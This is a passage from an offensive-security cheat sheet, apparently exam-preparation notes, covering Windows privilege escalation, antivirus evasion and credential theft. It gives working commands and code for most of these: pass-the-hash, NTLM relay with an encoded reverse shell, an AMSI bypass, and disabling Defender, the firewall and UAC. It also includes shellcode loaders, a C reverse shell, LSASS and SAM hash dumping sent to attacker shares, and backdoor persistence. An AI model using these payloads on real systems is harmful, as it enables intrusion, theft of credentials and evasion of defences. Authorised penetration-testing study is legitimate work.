# also start another netcat listener to catch the system shell
sudo nc -vlnp 443
```

On windows victim:

```powershell
# in windows reverse shell with "SeImpersonatePrivilege"
# or "SeAssignPrimaryTokenPrivilege" enabled

# grab the binary
iwr -uri http://LISTEN_IP/RoguePotato.exe -Outfile RoguePotato.exe

# run the exploit
./RoguePotato.exe -l 9999 -e "C:\Users\Public\revshell.exe" -r LISTEN_IP
# and bingo! you should have system on the listener you set up!
```

### 4.2.7 Windows Pass-The-Hash Attacks

There are lots of ways to pass the hash on windows, giving you access as a user
with just the hash of their creds.

See [Grabbing Hashes from Windows](#5.10.5%20Grabbing%20Hashes%20from%20Windows) for techniques on grabbing Windows password hashes.

Note: Windows NTLM hashes are in the form LMHASH:NTHASH. That convention is used here.

```sh
# Get remote powershell shell by passing the hash
# install: sudo apt install evil-winrm
evil-winrm -i $VICTIM_IP -u username -H NTHASH

# Run remote command as SYSTEM (note colon before NT hash)
impacket-psexec -hashes :NTHASH [DOMAIN/]administrator@$VICTIM_IP [whoami]
# omit the command to get interactive shell

# Run remote command as Administrator; same syntax as psexec
impacket-wmiexec -hashes :NTHASH [DOMAIN/]Administrator@$VICTIM_IP

# execute remote command as Admin (IP MUST GO LAST!)
crackmapexec smb -d DOMAIN -u Administrator -H LMHASH:NTHASH -x whoami $VICTIM_IP

# spawn cmd.exe shell on remote windows box
# replace 'admin' with username, 'hash' with full LM-NTLM hash (colon-separated)
pth-winexe -U 'admin%hash' //WINBOX_IP cmd.exe

# other options for PtH: xfreerdp, smbclient
```


### 4.2.8 Windows NTLMv2 Hash Relay Attack

When you can't crack an NTLMv2 hash that you were able to capture with Responder, you can relay it to another machine for access/RCE (assuming it's an admin hash, and Remote UAC restrictions are disabled on the target). If this works, you get instant SYSTEM on the remote machine.

```sh
# '-c' flag is command to run
# here we are generating a powershell reverse shell one-liner
# as base64-encoded command
sudo impacket-ntlmrelayx -t VICTIM_IP --no-http-server -smb2support -c "powershell -enc $(msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=tun0 | iconv -t UTF-16LE | base64 | tr -d '\n')"

# start a netcat listener to catch the reverse shell
sudo nc -nvlp 443
```


## 4.3 Antivirus & Firewall Evasion

Advanced Evasion techniques:

- https://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/
- https://web.archive.org/web/20210317102554/https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf

### 4.3.1 Cross-Compiling Windows Binaries on Linux

You can use `mingw` to cross-compile C files.

```sh
# make sure you link Winsock with `-lws2_32` when using winsock.h
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

# you can test that windows EXE's run as expected by using 'wine':
wine syncbreeze_exploit.exe
```

[MonoDevelop](https://www.monodevelop.com/download/) is a cross-platform IDE for C# and .NET.



### 4.3.2 Shellter

You can use `shellter` to inject a malicious payload into a legitimate Windows 32-bit executable. Just run `shellter` in the terminal and follow the prompts. Recommend using `stealth` mode so it doesn't alert the user. The paid version of `shellter` supports 64-bit executables.

To check that your exploit works:

```sh
# start listener for reverse shell
sudo nc -lvnp 443

# run shellter-injected binary with wine
wine derp.exe
```

**NOTE:** I've had issues using the binaries under `/usr/share/windows-resources/binaries/`, so download something like PuTTY from the internet instead. Make sure you get the 32-bit version of whatever binary you grab.



### 4.3.3 Windows Process Injection

The general technique for injecting shellcode into another (running) process goes like this:

1. ***OpenProcess*** - Get a HANDLE to a target process that you have permissions to access
2. ***VirtualAllocEx*** - Allocate memory within the target process
3. ***WriteProcessMemory*** - Copy your shellcode into the target process's memory
4. ***CreateRemoteThread*** - Start execution of your shellcode in new thread running within target process

These are the most common Windows APIs used to accomplish this, but there are [many other alternatives](https://malapi.io/).

Here is a PowerShell implementation of a simple "process injector" that injects the shellcode into itself and runs it:

```powershell
$imports = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$w = Add-Type -memberDefinition $imports -Name "derp" -namespace Win32Functions -passthru;

# msfvenom -p windows/shell_reverse_tcp -f powershell -v s LPORT=443 LHOST=tun0
[Byte[]];
[Byte[]]$s = <SHELLCODE HERE>;

$size = 0x1000;

if ($s.Length -gt 0x1000) {$size = $s.Length};

$x = $w::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($s.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $s[$i], 1)};

$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```



### 4.3.4 Windows AMSI Bypass

This one-liner lets you get past Windows' Antimalware Scan Interface (AMSI), which
will e.g. block malicious powershell scripts from running. If you get a warning
saying something like "This script contains malicious content and has been blocked
by your antivirus software", then run this command to disable that blocker.

```powershell
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

Other bypasses available through nishang's [Invoke-AMSIBypass](https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1).



### 4.3.5 Turn off Windows Firewall

```powershell
# must be done from administrator prompt
# Disable Windows firewall on newer Windows:
netsh advfirewall set allprofiles state off

# Disable Windows firewall on older Windows:
netsh firewall set opmode disable
```



### 4.3.6 Turn off Windows Defender

```powershell
# must be running powershell as Administrator
Set-MpPreference -DisableRealtimeMonitoring $true

# for completely removing Windows Defender (until next Windows update)
Uninstall-WindowsFeature -Name Windows-Defender
```

Alternatively, you should be able to do it with services:

```powershell
sc config WinDefend start= disabled
sc stop WinDefend

# to restart Defender
sc config WinDefend start= auto
sc start WinDefend
```

I think you can even disable it with Registry keys:

```powershell
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /t DWORD /d 1 /f

# more granular controls
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableBehaviorMonitoring /t DWORD /d 1 /f
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableOnAccessProtection /t DWORD /d 1 /f
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableScanOnRealtimeEnable /t DWORD /d 1 /f

# then reboot for changes to take effect
```



### 4.3.7 Windows Encoding/Decoding with LOLBAS

```powershell
# base64 encode a file
certutil -encode inputFileName encodedOutputFileName
# base64 decode a file
certutil -decode encodedInputFileName decodedOutputFileName
# hex decode a file
certutil --decodehex encoded_hexadecimal_InputFileName
# MD5 checksum
certutil -hashfile somefile.txt MD5
```



### 4.3.8 Execute Inline Tasks with MSBuild.exe

MSBuild is built into Windows .NET framework, and it lets you execute arbitrary
C#/.NET code inline. Modify the XML file below with your shellcode from
msfvenom's "-f csharp" format (or build a payload with Empire's
windows/launcher_xml stager, or write your own C# and host over SMB)

To build:
```powershell
# locate MSBuild executables
dir /b /s C:\msbuild.exe

# execute 32-bit shellcode
C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe  payload.xml

# execute 64-bit shellcode
C:\Windows\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe  payload.xml
```

Here's the payload.xml template to inject your shellcode into (if not building
with Empire)

```xml
<!-- This is 32-bit. To make 64-bit, swap all UInt32's for UInt64, use 64-bit
     shellcode, and build with 64-bit MSBuild.exe
     Building Shellcode:
     msfvenom -p windows/shell_reverse_tcp -f csharp lport=443 lhost=tun0 | tee shellcode.cs
-->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee -->
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>

      <Code Type="Class" Language="cs">
      <!-- to host code remotely, instead use:
      <Code Type="Class" Language="cs" Source="\\ATTACKER_IP\share\source.cs">
      -->
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {
          private static UInt32 MEM_COMMIT = 0x1000;
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );
          public override bool Execute()
          {
            //PUT YOUR SHELLCODE HERE;

            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return true;
          }
        }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```



### 4.3.9 Custom Windows TCP Reverse Shell

A custom reverse shell can often get past antivirus.

```c
/* Win32 TCP reverse cmd.exe shell
 * References:
 * https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-basic-winsock-application
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_addr
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-htons
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect
 * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
 * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
 * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
 * https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)
 */
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

// CHANGE THESE
#define TARGET_IP   "LISTEN_IP"
#define TARGET_PORT 443

void main(void) {
  SOCKET s;
  WSADATA wsa;
  STARTUPINFO si;
  struct sockaddr_in sa;
  PROCESS_INFORMATION pi;

  WSAStartup(MAKEWORD(2,2), &wsa);
  s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = inet_addr(TARGET_IP);
  sa.sin_port = htons(TARGET_PORT);
  WSAConnect(s, (struct sockaddr *)&sa, sizeof(sa), NULL, NULL, NULL, NULL);
  SecureZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES;
  si.hStdInput = (HANDLE)s;
  si.hStdOutput = (HANDLE)s;
  si.hStdError = (HANDLE)s;
  CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}
```

To compile on Kali (as 32-bit binary because it works on both 32- and 64-bit):

```sh
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install mingw-w64 wine
i686-w64-mingw32-gcc rsh.c -o rsh.exe -s -lws2_32
```



### 4.3.10 Windows UAC Bypass

Only the local "Administrator" user can perform admin actions without any User Account Control (UAC) restrictions. All other admin user accounts must normally pass UAC checks to perform admin actions, unless UAC is disabled.

UAC Enabled registry key (can only modify as admin):

``` powershell
# Disabling UAC via registry:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t DWORD /f /d 0

# Enabling UAC:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t DWORD /f /d 1
```

Bypass Technique:

```powershell
# Ref: https://mobile.twitter.com/xxByte/status/1381978562643824644
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
fodhelper

# To undo:
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```



## 4.4 Windows Passwords & Hashes

Windows NTLM hashes are in the form LMHASH:NTHASH. That convention is used here.

> **NOTE**: The empty/blank LM hash value is always `aad3b435b51404eeaad3b435b51404ee`.
> The empty/blank NT hash value is always `31d6cfe0d16ae931b73c59d7e0c089c0`.

Encrypted passwords can often be recovered with tools like [NirSoft](http://www.nirsoft.net/password_recovery_tools.html)


### 4.4.1 Windows Passwords in Files

Some of these passwords are cleartext, others are base64-encoded. Groups.xml has
an AES-encrypted password, but the static key is published on the MSDN website.

To decrypt the Groups.xml password: `gpp-decrypt encryptedpassword`

```powershell
# Unattend files
%SYSTEMDRIVE%\unattend.txt
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

# Group Policy Object files
# decode 'cpassword' with kali gpp-decrypt or gpp-decrypt.py (https://github.com/t0thkr1s/gpp-decrypt)
%WINDIR%\SYSVOL\Groups.xml
%WINDIR%\SYSVOL\scheduledtasks.xml
%WINDIR%\SYSVOL\Services.xml

# sysprep
%SYSTEMDRIVE%\sysprep.inf
%SYSTEMDRIVE%\sysprep\sysprep.xml

# FileZilla config:
# look for admin creds in FileZilla Server.xml
dir /s/b C:\FileZilla*.xml
type "FileZilla Server.xml" | findstr /spin /c:admin
type "FileZilla Server Interface.xml" | findstr /spin /c:admin

# less likely, still worth looking
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```


**Finding Passwords in Windows Files**:

```powershell
# search specific filetypes for "password"
findstr /spin password *.txt *.xml *.ini *.config

# Searching all files (lots of output)
findstr /spin "password" *.*

# find files that might have credentials in them
cd \ && dir /b /s *vnc.ini Groups.xml sysprep.* Unattend.* Unattended.*
dir /b /s *passw* *creds* *credential*
dir /b /s *.config *.conf *.cfg
```


### 4.4.2 Windows Passwords in Registry

```powershell
# Windows autologin credentials (32-bit and 64-bit versions)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /reg:64 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

**Wifi Passwords Saved on Windows**:

```powershell
# show all saved wifi networks
netsh wlan show profiles

# get password of specific network 'WIFINAME'
wlan show profile WIFINAME key=clear

# PEAP wifi network passwords are stored in registry
# Display all keys, values and data under the PEAP profiles:
reg query 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' /s /f *
reg query 'HKCU\Software\Microsoft\Wlansvc\UserData\Profiles' /s /f *

# Save the passwords in registry to a file
reg save 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hklm.hiv
reg save 'HKCU\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hkcu.hiv
```

### 4.4.3 Grabbing Hashes from Windows

```powershell
# Grab them from the registry
reg save hklm\sam %TEMP%\sam.hiv /y
reg save hklm\system %TEMP%\system.hiv /y
reg save hklm\security %TEMP%\security.hiv /y
copy %TEMP%\sam.hiv \\LISTEN_IP\share
copy %TEMP%\system.hiv \\LISTEN_IP\share
copy %TEMP%\security.hiv \\LISTEN_IP\share

# clean up stolen registry files
del %TEMP%\*.hiv

# Grab the backups from disk
copy %WINDIR%\repair\sam \\LISTEN_IP\share\sam-repair.hiv
copy %WINDIR%\repair\system \\LISTEN_IP\share\system-repair.hiv
copy %WINDIR%\repair\security \\LISTEN_IP\share\security-repair.hiv
```

Then, on attack box:

```sh
# using impacket secretsdump.py (security.hiv optional)
impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv -outputfile secretsdump LOCAL
```

Alternatively, you can grab the hashes directly from LSASS.exe memory using
Sysinternals tools:

```powershell
procdump64.exe -accepteula -ma lsass.exe %TEMP%\lsass.mem
copy %TEMP%\lsass.mem \\LISTEN_IP\share
```

#### 4.4.3.1 Dumping Hashes from Windows Registry Backups

Look for these files:

```powershell
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security

%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav

%SYSTEMROOT%\ntds\ntds.dit
%WINDIR%\ntds\ntds.dit
```

#### 4.4.3.2 Dumping Hashes from Windows Domain Controller

DCSync Attack (see Active Directory - DCSync section below).

```sh
# requires authentication
impacket-secretsdump -just-dc-ntlm -outputfile secretsdump DOMAIN/username:Password@DC_IP_or_FQDN
```

#### 4.4.3.3 Grab NTLMv2 Hashes Using Responder

Note: In addition to SMB, [Responder](https://github.com/lgandx/Responder) also includes other protocol servers (including HTTP and FTP) as well as poisoning capabilities for Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Multicast DNS (MDNS).

```sh
# start Responder
# if your victim is Windows XP/Server 2003 or earlier, add '--lm' flag
sudo responder -I tap0
# verify it shows:
# SMB server    [ON]
```

Once you have Responder's SMB server listening, you can force your victim to authenticate to you in several ways:

- With remote code execution, run `net use \\ATTACKER_IP\derp` or (PowerShell) `ls \\ATTACKER_IP\derp`.
- With ability to upload files to victim web server, **enter a non-existing file with a UNC path** like `\\ATTACKER_IP\derp\nonexistent.txt`
	- To do this, capture a normal upload with Burp, then change the "filename" field to have a UNC path. **Use double-backslashes!!** (i.e. `filename="\\\\192.168.45.192\\derp\\secrets.txt"`)
	- Here's how to do it with curl:

```sh
# Malicious file upload to non-existent UNC path, triggering NTLMv2 auth with Responder
# Change 'myFile' to the file's form-field name.
# The '@-' tells curl to take the file content from stdin,
# which is just the 'echo derp' output.
# Adding the ';filename=' coerces curl to set your custom filename in the form post
# Remember, you must use double-backslashes to escape them properly!!!
# '-x' arg passes your curl payload to Burp proxy for inspection
echo derp | curl -s -x "http://127.0.0.1:8080" -F 'myFile=@-;filename=\\\\ATTACKER_IP\\derp\\derp.txt' "http://VICTIM_IP/upload" 
```

After the victim tries to authenticate to the Responder SMB server, you should see it display the NTLMv2 hash that it captured during the handshake process:

```
...
[+] Listening for events... 
[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000 
```

Copy the hash and save it to a file. Then crack it with hydra/john:

```sh
hashcat -m 5600 responder.hash /usr/share/wordlists/rockyou.txt --force
```


#### 4.4.3.4 Dump Hashes and Passwords Using Crackmapexec

Probably the easiest way to grab all the hashes from a box once you have admin creds or an admin hash:

```sh
# dump SAM (using PtH)
cme smb VICTIM -u Administrator -H NTHASH --local-auth --sam

# dump LSA
cme smb VICTIM -u Administrator -p PASSWORD --local-auth --lsa

# dump NTDS.dit
cme smb VICTIM_DC -u DOMAIN_ADMIN -H NTHASH --ntds
```


#### 4.4.3.5 Dump Hashes and Passwords Using mimikatz

[PayloadsAllTheThings: Mimikatz](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)

To steal from LSASS, you need to be running as SYSTEM or Administrator with the `SeDebugPrivilege`.

To perform Token Elevation (i.e. to get SYSTEM), you require the `SeImpersonatePrivilege` access right.

The format of mimikatz commands is `module::command`.

```powershell
.\mimikatz.exe
# start logging session to file
log \\ATTACKER_IP\share\mimikatz.log
# enable full debug privileges to have access to system memory
privilege::debug
# elevate to system
token::elevate
# get hashes and try to print plaintext passwords
sekurlsa::logonpasswords
# dump hashes from SAM
lsadump::sam
# list all available kerberos tickets
sekurlsa::tickets
# List Current User's kerberos tickets
kerberos::list
# tries to extract plaintext passwords from lsass memory
sekurlsa::wdigest
# Get just the krbtgt kerberos tikcket
sekurlsa::krbtgt

# patch CryptoAPI to make non-exportable PKI keys exportable
crypto::capi
# patch KeyIso to make non-exportable PKI keys exportable
crypto::cng

# get google chrome saved credentials
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
dpapi::chrome /in:"c:\users\administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

If **LSA Protection** is enabled (default starting with Windows 8.1), this hampers your ability to collect hashes without first bypassing it.

```powershell
# check if LSA Protection enabled (key set to 1 or 2)
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

First, make sure `mimidriver.sys` is in the current working directory (usually same as `mimikatz.exe`).

In mimikatz terminal:

```powershell
# install the mimidriver.sys on the host
!+

# remove the protection flags from lsass.exe process
!processprotect /process:lsass.exe /remove

# Finally run the logonpasswords function to dump lsass
privilege::debug    
token::elevate
sekurlsa::logonpasswords

# re-add protection flags to lsass.exe
!processprotect /process:lsass.exe

# uninstall mimidriver.sys from system
!-
```

For **Credential Guard**, you have to disable it from an elevated shell before you can start getting credentials from LSASS. Use [this script](https://www.microsoft.com/en-us/download/details.aspx?id=53337) to disable it, passing the `-Disable` flag.



## 4.5 Miscellaneous Windows Commands

cmd.exe:

```powershell
# restart/reboot the machine now
shutdown /r /t 0

# infinite loop of reverse shell command every 60 seconds
# in cmd.exe
for /l %n in () do @(
  @echo Replace with your command here...
  .\nc.exe -e cmd ATTACKER_IP 443
  timeout /t 60 /nobreak > NUL
)

# same thing, in powershell
while ($true) {start-process -NoNewWindow -file .\nc.exe -arg "-e", "cmd", "192.168.251.220", "443"; Start-Sleep -Seconds 60;}

# run regedit as SYSTEM (to view protected keys)
psexec.exe -i -s regedit.exe
# check out HKLM\Software\Microsoft\Windows NT\Current Version\Winlogon\

# use `runas` to execute commands as another user
# requires their password. 
# Using `runas` this way requires a GUI session (RDP) to enter password in prompt.
runas /user:VICTIM cmd

# recursively list files with Alternate Data Streams
dir /s /r /a | find ":$DATA"
gci -recurse | % { gi $_.FullName -stream * } | where {(stream -ne ':$Data') -and (stream -ne 'Zone.Identifier')}
# print Alternate Data Stream to console
powershell get-content -path /path/to/stream/file  -stream STREAMNAME
# hide a file in an Alternate Data Stream
type evil.exe > benign.dll:evil.exe
# delete ADS from file
powershell remove-item -path /path/to/stream/file  -stream STREAMNAME

# Check if OS is 64-bit
(wmic os get OSArchitecture)[2]

# Set terminal to display ansi-colors
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
powershell Set-ItemProperty HKCU:\Console VirtualTerminalLevel -Type DWORD 1

# Current User Domain
echo %userdomain%

# manually enabling PowerShell logging
reg add HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0x1 /f
reg add HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v OutputDirectory /t REG_SZ /d C:/ /f
reg add HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableInvocationHeader /t REG_DWORD /d 0x1 /f
```

PowerShell:

```powershell
# determine if current powershell process is 64-bit
[System.Environment]::Is64BitProcess

# determine if OS is 64-bit (various methods)
[System.Environment]::Is64BitOperatingSystem
(Get-WMIObject Win32_OperatingSystem).OSArchitecture
(Get-WMIObject CIM_OperatingSystem).OSArchitecture
(Get-WMIObject Win32_Processor).AddressWidth
[System.IntPtr]::Size  # 4 = 32-bit, 8 = 64-bit

# Base64 Decode
[System.Text.Encoding]::UTF8.GetSTring([System.convert]::FromBase64String("BASE64STRING"))

# Base64 Encode
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("SOMETEXT"))

# Zip a directory using Powershell 3.0 (Win8)
Add-Type -A 'System.IO.Compression.FileSystem';
[IO.Compression.ZipFile]::CreateFromDirectory('C:\folder', 'C:\output.zip')

# Zip a directory using Powershell 5.0 (Win10)
Compress-Archive -Path 'C:\folder' -DestinationPath 'C:\output.zip'
```

## 4.6 Windows Persistence

### 4.6.1 Add RDP User

```powershell
net user derp /add /passwordreq:no /y
net localgroup Administrators derp /add
net localgroup "Remote Desktop Users" derp /add
# enable remote desktop / enable rdp
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
# delete user
net user derp /del
# disable remote desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```

**Connecting via RDP:**

```sh
xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:$VICTIM_IP
# to attach a drive, use:
# /drive:derp,/path/to/share
```

### 4.6.2 Remote SYSTEM Backdoor

These techniques require having Admin credentials for the target machine.

#### 4.6.2.1 Backdoor Windows Services

Services give you SYSTEM access.

```powershell
# You must establish SMB session with admin creds first!!
net use \\VICTIM_NAME [PASSWORD] /u:Administrator
# or mount an smb share on the target:
net use * \\VICTIM_NAME\[share] [PASSWORD] /u:Administrator

# open a backdoor netcat bind-shell with system privileges on a remote host
sc \\VICTIM_NAME create derp binpath= "cmd.exe /k %temp%\nc.exe -l -p 22222 -e cmd.exe"

# start the service
sc \\VICTIM_NAME start derp
# or
net start derp

# delete the service
sc \\VICTIM_NAME delete derp
```

#### 4.6.2.2 Backdoor Service with PSExec

Alternate way to create a backdoor service. Services give you SYSTEM access.

NOTE: SysInternals PSExec leaves a copy of the service on the machine after
you run it, which you must manually remove with `sc \\VICTIM_NAME delete psexec`.
The Metasploit module and nmap NSE script clean up the service for you.

```powershell
# '-c' passes copy of command to remote systsem even if not already present
# '-s' runs command as systsem
# '-d' runs command in detached mode. Use if you want PSExec to run something
# in the background (won't wait for process to finish, nor passs input/output
# back to caller).
psexec \\VICTIM_IP -c -s -d -u Administrator -p password "nc.exe -n ATTACKER_IP -e cmd.exe"
# If username and password are omitted, psexec uses current user's creds on
# the remote machine.
```

#### 4.6.2.3 Backdoor Scheduled Tasks

Scheduled Tasks normally give you Administrator access, but you can use `/ru system` to make them give you SYSTEM access.

```powershell
# schtasks ("/ru system" runs as system)
schtasks /create /tn TASKNAME /s VICTIM_IP /u Administrator /p password /sc FREQUENCY /st HH:MM:SS /sd MM/DD/YYY /ru system /tr COMMAND
# frequency: once, minute, hourly, daily, weekly, monthly, onstart, onlogon, onidle

# query schtasks
schtasks /query /s VICTIM_IP

# delete schtask ('/f' to force)
schtasks /delete /s VICTIM_IP /u Administrator /p password /tn TASKNAME

# at (deprecated on newer machines, but still should work)
at \\VICTIM_IP HH:MM[A|P] COMMAND

# query at
at \\VICTIM_IP
```

### 4.6.3 Backdoor via WMIC

WMIC creates a remote process running with Administrator privileges. It's a non-persistent backdoor (doesn't survive restarts).

```powershell
# create admin bind-shell backdoor. Use '-d' for it to run without window
wmic process call create "%temp%\nc.exe -dlp 22222 -e cmd.exe"

# delete the wmic process
wmic process where name="nc.exe" delete
```

## 4.7 Windows Files of Interest

```powershell
# GPG keys
